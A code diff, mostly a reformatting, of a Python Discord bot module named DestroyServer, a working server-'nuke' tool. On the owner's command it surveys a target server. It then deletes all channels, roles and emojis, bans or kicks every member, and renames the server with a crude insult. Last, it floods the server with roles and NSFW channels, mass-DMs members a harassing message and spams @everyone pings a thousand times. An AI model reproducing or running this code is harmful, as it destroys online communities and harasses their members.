@@ -1,316 +1,304 @@
-import chattrigger
+import asyncio
+import os
 
 import discord
 
-import os
+import chattrigger
 
-#import aiohttp
 
-#from chattriggers.probeserver import ProbeServer
+# import aiohttp
+# from chattriggers.probeserver import ProbeServer
 
-import traceback
-
-import asyncio
 
 class DestroyServer(chattrigger.ChatTrigger):
-	
-	async def run(self, message: discord.Message, trigger: str, client: discord.Client):
-		ownerid = int(os.environ.get("OWNER_ID"))
-		if not message.author.id == ownerid:
-			return
 
-		self.message = message
-		
-		self.targetguild = client.get_guild(int(message.content[len(trigger):]))
+    async def run(self, message: discord.Message, trigger: str, client: discord.Client):
+        ownerid = int(os.environ.get("OWNER_ID"))
+        if not message.author.id == ownerid:
+            return
 
-		await self.probeserver(self.targetguild, message)
-		
+        self.message = message
 
+        self.targetguild = client.get_guild(int(message.content[len(trigger):]))
 
-		stage1modules = [self.channelpurge, self.rolepurge, self.memberpurge, self.emotepurge, self.servernamechange] # stage 1: burn the town
+        await self.probeserver(self.targetguild, message)
 
-		stage2modules = [self.roleflood, self.channelflood, self.memberdmflood, self.pingflood] # stage 2: salt the earth
+        stage1modules = [self.channelpurge, self.rolepurge, self.memberpurge, self.emotepurge,
+                         self.servernamechange]  # stage 1: burn the town
 
-		loop = asyncio.get_event_loop()
+        stage2modules = [self.roleflood, self.channelflood, self.memberdmflood,
+                         self.pingflood]  # stage 2: salt the earth
 
-		await message.channel.send(f"Raining destruction on {str(self.targetguild)}")
-		print(f"Raining destruction on {str(self.targetguild)}")
+        loop = asyncio.get_event_loop()
 
-		for i in stage1modules:
-			#loop.create_task(i())
-			await i()
-		
-		for i in stage2modules:
-			loop.create_task(i(self.targetguild))
+        await message.channel.send(f"Raining destruction on {str(self.targetguild)}")
+        print(f"Raining destruction on {str(self.targetguild)}")
 
+        for i in stage1modules:
+            # loop.create_task(i())
+            await i()
 
+        for i in stage2modules:
+            loop.create_task(i(self.targetguild))
 
-		
+    # stopstopstop
 
-		#stopstopstop
-		
+    # async with aiohttp.ClientSession() as session:
+    # get = await session.get("https://i.imgur.com/fLgbLyq.jpg")
+    # gottenbytes = await get.read()
 
-		#async with aiohttp.ClientSession() as session:
-			#get = await session.get("https://i.imgur.com/fLgbLyq.jpg")
-			#gottenbytes = await get.read()
+    # try:
+    # XDXD
 
+    async def channelpurge(self):
+        counter = 0
+        for i in self.targetguild.channels:
+            try:
+                await i.delete()
+                print(f"Successfully delete {i.name}")
+                # await message.channel.send(f"Successfully delete {i.name}")
+                counter += 1
+            except:
+                print(f"Failed delete {i.name}")
+        # await message.channel.send
 
+        await self.message.channel.send(f"Successfully deleted {counter} channels.")
 
+    async def memberpurge(self):
 
-		#try:
-		 # XDXD
-		
+        counter = 0
 
-		
-	async def channelpurge(self):
-		counter = 0
-		for i in self.targetguild.channels:
-			try: 
-				await i.delete()
-				print(f"Successfully delete {i.name}")
-				#await message.channel.send(f"Successfully delete {i.name}")
-				counter += 1
-			except: 
-				print(f"Failed delete {i.name}")
-				#await message.channel.send
+        for i in self.targetguild.members:
+            try:
+                await i.ban()
+                print(f"Successfully banned {i.name}")
+                # await message.channel.send
+                counter += 1
+            except:
+                print(f"Failed to ban {i.name}")
+                try:
+                    await i.kick()
+                    counter += 1
+                except:
+                    print(f"Failed to kick {i.name}")
 
-		await self.message.channel.send(f"Successfully deleted {counter} channels.")
+        # await message.channel.send
 
-	async def memberpurge(self):
-		
-		counter = 0
+        await self.message.channel.send(f"Successfully removed {counter} members.")
 
-		for i in self.targetguild.members:
-			try: 
-				await i.ban()
-				print(f"Successfully banned {i.name}")
-				#await message.channel.send
-				counter += 1
-			except: 
-				print(f"Failed to ban {i.name}")
-				try:
-					await i.kick()
-					counter += 1
-				except:
-					print(f"Failed to kick {i.name}")
-					
-				#await message.channel.send
-		
-		await self.message.channel.send(f"Successfully removed {counter} members.")
+    async def rolepurge(self):
 
-	async def rolepurge(self):
-		
-		counter = 0
+        counter = 0
 
-		for i in self.targetguild.roles:
-			try: 
-				await i.delete()
-				print(f"Successfully delete {i.name}")
-				#await message.channel.send
-				counter += 1
-			except: print(f"Failed to delete {i.name}")
-		
-		await self.message.channel.send(f"Successfully deleted {counter} roles.")
-	
-	async def emotepurge(self):
+        for i in self.targetguild.roles:
+            try:
+                await i.delete()
+                print(f"Successfully delete {i.name}")
+                # await message.channel.send
+                counter += 1
+            except:
+                print(f"Failed to delete {i.name}")
 
-		counter = 0
+        await self.message.channel.send(f"Successfully deleted {counter} roles.")
 
-		for i in self.targetguild.emojis:
-			try:
-				await i.delete()
-				print(f"Successfully deleted {i.name}")
-				counter += 1
-			except: print(f"Failed to delete {i.name}")
+    async def emotepurge(self):
 
-		await self.message.channel.send(f"Successfully deleted {counter} emotes.")
+        counter = 0
 
-	async def servernamechange(self):
+        for i in self.targetguild.emojis:
+            try:
+                await i.delete()
+                print(f"Successfully deleted {i.name}")
+                counter += 1
+            except:
+                print(f"Failed to delete {i.name}")
 
-		#await self.targetguild.edit(name = "。死", icon = None)
-		await self.targetguild.edit(name = "Doin' your mom doin' doin' your mom", icon = None) # 2020-05-31 | I think doin' your mom doin' doin' your mom would be a better nuke-rename
-		# More universally understood
+        await self.message.channel.send(f"Successfully deleted {counter} emotes.")
 
+    async def servernamechange(self):
 
-		await self.message.channel.send(f"Successfully renamed the server.")
+        # await self.targetguild.edit(name = "。死", icon = None)
+        await self.targetguild.edit(name="Doin' your mom doin' doin' your mom",
+                                    icon=None)  # 2020-05-31 | I think doin' your mom doin' doin' your mom would be a better nuke-rename
+        # More universally understood
 
-	async def probeserver(self, targetserver: discord.Guild, message: discord.Message):
-		targetserver: discord.Guild = targetserver
+        await self.message.channel.send(f"Successfully renamed the server.")
 
-		messagestr = ""
+    async def probeserver(self, targetserver: discord.Guild, message: discord.Message):
+        targetserver: discord.Guild = targetserver
 
-		messagestr += f"**{targetserver.name}**\n"
+        messagestr = ""
 
-		if targetserver.owner == None:
-			messagestr += f"**Server has no owner!**\n"
-		else:
-			messagestr += f"**{str(targetserver.owner)} is owner.**\n"
+        messagestr += f"**{targetserver.name}**\n"
 
-		members = [str(x) for x in targetserver.members]
-		membersstr = ", ".join(members)
+        if targetserver.owner == None:
+            messagestr += f"**Server has no owner!**\n"
+        else:
+            messagestr += f"**{str(targetserver.owner)} is owner.**\n"
 
-		messagestr += f"**Members ({len(members)}):** "
+        members = [str(x) for x in targetserver.members]
+        membersstr = ", ".join(members)
 
-		messagestr += f"{membersstr}\n"
+        messagestr += f"**Members ({len(members)}):** "
 
-		channels = [str(x) for x in targetserver.channels]
-		channelsstr = ", ".join(channels)
+        messagestr += f"{membersstr}\n"
 
-		messagestr += f"**Channels ({len(channels)}):** "
+        channels = [str(x) for x in targetserver.channels]
+        channelsstr = ", ".join(channels)
 
-		messagestr += f"{channelsstr}\n"
+        messagestr += f"**Channels ({len(channels)}):** "
 
-		roles = [str(x) for x in targetserver.roles]
-		rolesstr = ", ".join(roles)
+        messagestr += f"{channelsstr}\n"
 
-		messagestr += f"**Roles ({len(roles)}):** "
+        roles = [str(x) for x in targetserver.roles]
+        rolesstr = ", ".join(roles)
 
-		messagestr += f"{rolesstr}\n"
+        messagestr += f"**Roles ({len(roles)}):** "
 
-		#
+        messagestr += f"{rolesstr}\n"
 
-		# 2020-05-28
+        #
 
-		emojis = [str(x) for x in targetserver.emojis]
-		emojisstr = ", ".join(emojis)
+        # 2020-05-28
 
-		messagestr += f"**Emojis ({len(emojis)}):**"
+        emojis = [str(x) for x in targetserver.emojis]
+        emojisstr = ", ".join(emojis)
 
-		messagestr += f"{emojisstr}\n"
+        messagestr += f"**Emojis ({len(emojis)}):**"
 
-		#
+        messagestr += f"{emojisstr}\n"
 
-		#
+        #
 
-		selfroles = [str(x) for x in targetserver.me.roles]
-		selfrolesstr = ", ".join(selfroles)
+        #
 
-		messagestr += f"**Dot2 Roles ({len(selfroles)}):** "
+        selfroles = [str(x) for x in targetserver.me.roles]
+        selfrolesstr = ", ".join(selfroles)
 
-		messagestr += f"{selfrolesstr}\n"
+        messagestr += f"**Dot2 Roles ({len(selfroles)}):** "
 
-		selfpermissions = targetserver.me.guild_permissions
+        messagestr += f"{selfrolesstr}\n"
 
-		messagestr += f"**Dot2 Permission Values:**\n"
+        selfpermissions = targetserver.me.guild_permissions
 
-		messagestr += f'''Administrator: {selfpermissions.administrator}
+        messagestr += f"**Dot2 Permission Values:**\n"
+
+        messagestr += f'''Administrator: {selfpermissions.administrator}
 Manage Channels: {selfpermissions.manage_channels},
 Manage Roles: {selfpermissions.manage_roles},
 Manage Guild: {selfpermissions.manage_guild},
 Ban Members: {selfpermissions.ban_members},
 Kick Members: {selfpermissions.kick_members}'''
 
+        messagestr = discord.utils.escape_mentions(messagestr)
 
+        #
 
-		messagestr = discord.utils.escape_mentions(messagestr)
+        chunksize = 2000  # discord 2000 character limit
 
-		#
+        # nofchunks = -(-len(messagestr) // chunksize) # ceiling division
 
-		chunksize = 2000 # discord 2000 character limit
+        # chunks = []
 
-		#nofchunks = -(-len(messagestr) // chunksize) # ceiling division
+        # a = ""
+        # c = 0
+        # for i in messagestr: # discord 2000 character limit
+        #	if c == chunksize:
+        #		print(len(a))
+        #		await message.channel.send(a)
+        #
+        #		a = ""
+        #		c = 0
+        #	a += str(i)
+        #	c += 1
+        # await message.channel.send(a)
 
-		#chunks = []
-		
-		#a = ""
-		#c = 0
-		#for i in messagestr: # discord 2000 character limit
-		#	if c == chunksize:
-		#		print(len(a))
-		#		await message.channel.send(a)
-		#		
-		#		a = ""
-		#		c = 0
-		#	a += str(i)
-		#	c += 1
-		#await message.channel.send(a)
+        # 2020-05-28
+        # make it not split words
 
-		# 2020-05-28
-		# make it not split words
+        messagecsplit = messagestr.split(",")
 
-		messagecsplit = messagestr.split(",")
+        tosend = ""
 
-		tosend = ""
+        for i in messagecsplit:
 
-		for i in messagecsplit:
+            if len(f"{tosend},{i}") > chunksize:
+                await message.channel.send(tosend)
+                tosend = ""  # reset str
 
-			if len(f"{tosend},{i}") > chunksize:
+            # else:
 
-				await message.channel.send(tosend)
-				tosend = "" # reset str
-			
-			#else:
+            tosend += f",{i}"  # the seperator (,) is removed with split, so add it back
 
-			tosend += f",{i}" # the seperator (,) is removed with split, so add it back
-		
-		await message.channel.send(tosend) # send the remainder
+        await message.channel.send(tosend)  # send the remainder
 
-	async def roleflood(self, targetserver: discord.Guild):
+    async def roleflood(self, targetserver: discord.Guild):
 
-		colour = discord.Colour.from_rgb(0, 255, 0) # perfect green, lime green, a very eye piercing colour
-		#permissions = discord.Permissions.all() # for the lulz
+        colour = discord.Colour.from_rgb(0, 255, 0)  # perfect green, lime green, a very eye piercing colour
+        # permissions = discord.Permissions.all() # for the lulz
 
-		#for i in range(10000):
+        # for i in range(10000):
 
-		#flood roles up to limit
+        # flood roles up to limit
 
-		print("starting role flood")
-		await self.message.channel.send("starting role flood")
+        print("starting role flood")
+        await self.message.channel.send("starting role flood")
 
-		while 1:
-			try:
-				#a = await targetserver.create_role(name = "PWNED", colour = colour, permissions = permissions, reason = "FUCK YOU LOLOLOL")
-				await targetserver.create_role(name = "JOHNIST", colour = colour, reason = "IN THE NAME OF JOHN")
-			except:
-				print("Reached role limit!")
-				#await a.delete()
-				await self.message.channel.send("Reached role limit!")
-				return
+        while 1:
+            try:
+                # a = await targetserver.create_role(name = "PWNED", colour = colour, permissions = permissions, reason = "FUCK YOU LOLOLOL")
+                await targetserver.create_role(name="JOHNIST", colour=colour, reason="IN THE NAME OF JOHN")
+            except:
+                print("Reached role limit!")
+                # await a.delete()
+                await self.message.channel.send("Reached role limit!")
+                return
 
-		#for i in range(6969): # jaja funny sex number
-		#	a = await targetserver.create_role(name = "PWNED", colour = colour, permissions = permissions, reason = "FUCK YOU LOLOLOL")
-		#	await a.delete()
-	
-	async def channelflood(self, targetserver: discord.Guild):
+    # for i in range(6969): # jaja funny sex number
+    #	a = await targetserver.create_role(name = "PWNED", colour = colour, permissions = permissions, reason = "FUCK YOU LOLOLOL")
+    #	await a.delete()
 
-		print("starting channel flood")
-		await self.message.channel.send("starting channel flood")
+    async def channelflood(self, targetserver: discord.Guild):
 
-		while 1:
-			try:
-				await targetserver.create_text_channel("JOHN IS HERE", position = 0, topic = "ALMIGHTY JOHN HAS LIBERATED US", slowmode_delay = 21600, nsfw = True, reason = "JOHN IS HERE TO STAY")
-			except:
-				print("Reached Channel Limit!")
-				await self.message.channel.send("Reached channel limit!")
-				return
+        print("starting channel flood")
+        await self.message.channel.send("starting channel flood")
 
-	async def memberdmflood(self, targetserver: discord.Guild): # 2020-05-06
+        while 1:
+            try:
+                await targetserver.create_text_channel("JOHN IS HERE", position=0,
+                                                       topic="ALMIGHTY JOHN HAS LIBERATED US", slowmode_delay=21600,
+                                                       nsfw=True, reason="JOHN IS HERE TO STAY")
+            except:
+                print("Reached Channel Limit!")
+                await self.message.channel.send("Reached channel limit!")
+                return
 
-		print("starting dm flood")
-		await self.message.channel.send("starting dm flood")
-		d = 0
-		for c, i in enumerate(targetserver.members, start = 1):
-			try:
-				dmc = await i.create_dm()
+    async def memberdmflood(self, targetserver: discord.Guild):  # 2020-05-06
 
-				await dmc.send("hey, john here. im doin' your mom doin' doin' your mom")
+        print("starting dm flood")
+        await self.message.channel.send("starting dm flood")
+        d = 0
+        for c, i in enumerate(targetserver.members, start=1):
+            try:
+                dmc = await i.create_dm()
 
-				d += 1
-			except:
-				#traceback.print_exc()
-				pass
-		
-		await self.message.channel.send(f"sent {d}/{c} dms")
-	
-	async def pingflood(self, targetserver: discord.Guild): # 2020-06-01
+                await dmc.send("hey, john here. im doin' your mom doin' doin' your mom")
 
-		print("starting ping flood")
-		await self.message.channel.send("starting ping flood")
+                d += 1
+            except:
+                # traceback.print_exc()
+                pass
 
-		for i in range(1000):
-			for i in targetserver.channels:
+        await self.message.channel.send(f"sent {d}/{c} dms")
 
-				await i.send('''@everyone
+    async def pingflood(self, targetserver: discord.Guild):  # 2020-06-01
+
+        print("starting ping flood")
+        await self.message.channel.send("starting ping flood")
+
+        for i in range(1000):
+            for i in targetserver.channels:
+                await i.send('''@everyone
 
 **All hail the crusaders of John**
 
@@ -334,4 +322,4 @@ Immortalized after inevitable victory
 The heretics will fall with our mighty assault
 Crusader, Crusader, Ioannes Vult''')
 
-		await self.message.channel.send(f"Done Ping Flood")
+        await self.message.channel.send(f"Done Ping Flood")
